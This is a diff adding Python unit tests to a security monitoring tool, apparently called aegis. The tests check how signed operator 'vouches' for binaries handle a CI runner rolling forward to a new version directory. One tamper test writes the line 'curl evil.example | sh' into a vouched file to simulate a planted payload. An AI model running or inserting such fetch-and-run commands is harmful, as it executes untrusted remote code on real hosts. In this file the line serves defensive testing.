@@ -34,6 +34,7 @@ test_provenance_tier.py, for the same reason: everything here quiets something.
 """
 import os
 import shutil
+import subprocess
 import sys
 import tempfile
 import unittest
@@ -41,6 +42,7 @@ import unittest
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 import aegis  # noqa: E402
 from test_provenance_tier import _baseline_shaped, _job  # noqa: E402
+from test_regression import needs_the_real_body  # noqa: E402
 
 
 class CarrySandbox(unittest.TestCase):
@@ -402,6 +404,197 @@ class AChainVerdictReachesTheBaseline(unittest.TestCase):
         self.assertEqual(aegis._accept_into_baseline([i]), [],
                          "the fingerprint the operator reviewed is gone, so "
                          "the change stands as its own unreviewed fact")
+
+
+def _have_ssh_keygen():
+    return os.path.exists("/usr/bin/ssh-keygen")
+
+
+# `needs_the_real_body` as well as the ssh-keygen guard, and the two are not
+# redundant. On a real Windows host `/usr/bin/ssh-keygen` is absent and the
+# first guard skips. Under SIM_BODY=win on a POSIX host it is PRESENT, so the
+# class runs — and `ssh-keygen -Y verify` then fails against the simulated
+# flags, emptying the vouch store with "not signed by a pinned signer" before
+# a single assertion here is reached. That failure is upstream of everything
+# this file tests, and it is not new: every one of test_vouch_tier.py's 18
+# cases fails the same way under simulation today. The windows-latest leg runs
+# the real thing against a real kernel on every PR.
+@unittest.skipUnless(_have_ssh_keygen(), "ssh-keygen not available")
+@needs_the_real_body
+class AVouchTheWorkloadOutgrew(unittest.TestCase):
+    """The silent failure that cost 2026-09-09 through 2026-09-19.
+
+    Two self-hosted CI runners were vouched at
+    `<runner>/bin.2.336.0/Runner.Listener`. The runner auto-updated, repointed
+    its `bin` symlink at `bin.2.337.0`, and every sensor began reporting the
+    new binary — which no vouch covered, so it alarmed correctly as an
+    unvouched workload (incidents #498, #499, #509).
+
+    Nothing was broken, which is exactly why nothing reported it. The old
+    vouch is still signature-valid, still unexpired, and its file still exists
+    with precisely the pinned bytes, so EVERY staleness test that asks about
+    the record passes and `vouch list` printed "active". A bytes-changed check
+    — the obvious fix — would have scored zero here. The vouch had simply been
+    left behind by the workload, and the operator's only signal was an alarm
+    they could not explain.
+    """
+
+    PRINCIPAL = "operator@test.invalid"
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp(prefix="aegis_superseded_")
+        state = os.path.join(self.tmp, ".aegis")
+        os.makedirs(state)
+        self._saved = {}
+        for k, v in (("STATE_DIR", state),
+                     ("VOUCH_FILE", os.path.join(state, "vouches.jsonl")),
+                     ("VOUCH_SIGNERS", os.path.join(state, "vouch_signers")),
+                     ("CUSTODY_FILE", os.path.join(state, "custody.jsonl")),
+                     ("RUN_LOG", os.path.join(state, "run.log"))):
+            self._saved[k] = getattr(aegis, k)
+            setattr(aegis, k, v)
+        self._reset_caches()
+        self.key = os.path.join(self.tmp, "vouchkey")
+        subprocess.check_call(
+            ["/usr/bin/ssh-keygen", "-t", "ed25519", "-N", "", "-C", "test",
+             "-f", self.key], stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL)
+        with open(self.key + ".pub", encoding="utf-8") as f:
+            pub = f.read().strip()
+        with open(aegis.VOUCH_SIGNERS, "w", encoding="utf-8") as f:
+            f.write("%s %s\n" % (self.PRINCIPAL, pub))
+        # The real layout: a versioned install directory rolled forward.
+        self.runner = os.path.join(self.tmp, "actions-runners", "lab-os")
+        self.old = self._runner_binary("bin.2.336.0", "old runner")
+        self.new = self._runner_binary("bin.2.337.0", "new runner")
+
+    def tearDown(self):
+        for k, v in self._saved.items():
+            setattr(aegis, k, v)
+        self._reset_caches()
+        shutil.rmtree(self.tmp, ignore_errors=True)
+
+    def _reset_caches(self):
+        aegis._VOUCH_CACHE.update({"key": None, "active": None,
+                                   "reason": None})
+        aegis._CUSTODY_CARRY_CACHE.clear()
+        aegis._GRADED_SHA_CACHE.clear()
+
+    def _runner_binary(self, version_dir, body):
+        d = os.path.join(self.runner, version_dir)
+        os.makedirs(d)
+        path = os.path.join(d, "Runner.Listener")
+        with open(path, "w", encoding="utf-8") as f:
+            f.write("#!/bin/sh\necho %s\n" % body)
+        return path
+
+    def _vouch(self, path):
+        rec = aegis._vouch_record("vouch", path, self.PRINCIPAL,
+                                  endpoints=("20.85.130.105:443",))
+        out = aegis._vouch_append(rec, self.key)
+        self._reset_caches()
+        return out
+
+    # -- the behaviour -----------------------------------------------------
+
+    def test_the_old_vouch_looks_perfectly_healthy(self):
+        """Why nothing caught it: every record-shaped question answers fine."""
+        self._vouch(self.old)
+        vouches, tamper = aegis.load_vouches()
+        self.assertIsNone(tamper)
+        self.assertEqual(len(vouches), 1)
+        rec = list(vouches.values())[0]
+        self.assertEqual(aegis._vouch_health(rec)[0], "applies",
+                         "the vouched file still exists with the pinned "
+                         "bytes — a staleness check on the RECORD sees "
+                         "nothing wrong, which is the whole problem")
+
+    def test_the_updated_binary_names_the_vouch_it_outgrew(self):
+        self._vouch(self.old)
+        self.assertFalse(aegis._vouch_covers(self.new),
+                         "the new binary is genuinely unvouched")
+        found = aegis._vouch_superseded_by(self.new)
+        self.assertIsNotNone(found, "the sibling vouch must be findable")
+        # realpath on both sides: the vouch store records the resolved path,
+        # and on macOS a temp dir reaches it through the /private firmlink.
+        self.assertEqual(found.get("path"), os.path.realpath(self.old))
+        note = aegis._vouch_superseded_note(self.new)
+        self.assertIn(os.path.realpath(self.old), note,
+                      "the note must name the vouch, or it is not actionable")
+
+    def test_it_is_a_note_and_never_a_rung(self):
+        """The security property. A vouch for a sibling is not a vouch for
+        these bytes: if it demoted anything, dropping a payload beside a
+        vouched binary would inherit quiet — the one thing the vouch tier
+        exists to make impossible."""
+        self._vouch(self.old)
+        sev, rung, note = aegis._grade_binary("HIGH", self.new)
+        self.assertEqual(sev, "HIGH", "severity must be untouched")
+        self.assertIsNone(rung, "no rung may be awarded by proximity")
+        self.assertTrue(note and os.path.realpath(self.old) in note,
+                        "but the operator is told which vouch was outgrown")
+
+    def test_re_vouching_the_new_path_resolves_it(self):
+        self._vouch(self.old)
+        self._vouch(self.new)
+        sev, rung, _note = aegis._grade_binary(
+            "HIGH", self.new, endpoint="20.85.130.105:443")
+        self.assertEqual(rung, "operator-vouched")
+        self.assertEqual(sev, "LOW")
+
+    # -- and does not over-reach -------------------------------------------
+
+    def test_a_different_program_is_never_explained_by_this_vouch(self):
+        self._vouch(self.old)
+        other = os.path.join(os.path.dirname(self.new), "Runner.Worker")
+        with open(other, "w", encoding="utf-8") as f:
+            f.write("#!/bin/sh\n")
+        self.assertIsNone(aegis._vouch_superseded_by(other),
+                          "same directory is not the test; same PROGRAM is")
+
+    def test_two_differing_components_do_not_match(self):
+        """One component apart is a version roll. Two is a different install,
+        and explaining it by this vouch would be a guess."""
+        self._vouch(self.old)
+        far = os.path.join(self.tmp, "actions-runners", "other-os",
+                           "bin.2.337.0", "Runner.Listener")
+        os.makedirs(os.path.dirname(far))
+        with open(far, "w", encoding="utf-8") as f:
+            f.write("#!/bin/sh\n")
+        self.assertIsNone(aegis._vouch_superseded_by(far))
+
+    def test_no_vouches_at_all_is_silent(self):
+        self.assertIsNone(aegis._vouch_superseded_by(self.new))
+        self.assertIsNone(aegis._vouch_superseded_note(self.new))
+
+
+    # -- vouch health ------------------------------------------------------
+    #
+    # "active" was only ever a claim about the RECORD -- verified and
+    # unexpired. Whether it still grades anything is a separate question
+    # nothing used to ask, and `vouch list` now answers it per row.
+
+    def test_bytes_changed_under_a_vouched_path_is_stale(self):
+        self._vouch(self.old)
+        with open(self.old, "a", encoding="utf-8") as f:
+            f.write("curl evil.example | sh\n")
+        rec = list(aegis.load_vouches()[0].values())[0]
+        health, why = aegis._vouch_health(rec)
+        self.assertEqual(health, "bytes-changed")
+        self.assertTrue(why)
+        self.assertFalse(aegis._vouch_covers(self.old),
+                         "and it really has stopped grading")
+
+    def test_a_vanished_target_is_stale(self):
+        self._vouch(self.old)
+        os.remove(self.old)
+        rec = list(aegis.load_vouches()[0].values())[0]
+        self.assertEqual(aegis._vouch_health(rec)[0], "path-gone")
+
+    def test_a_live_vouch_reports_applies(self):
+        self._vouch(self.old)
+        rec = list(aegis.load_vouches()[0].values())[0]
+        self.assertEqual(aegis._vouch_health(rec), ("applies", ""))
 
 
 if __name__ == "__main__":
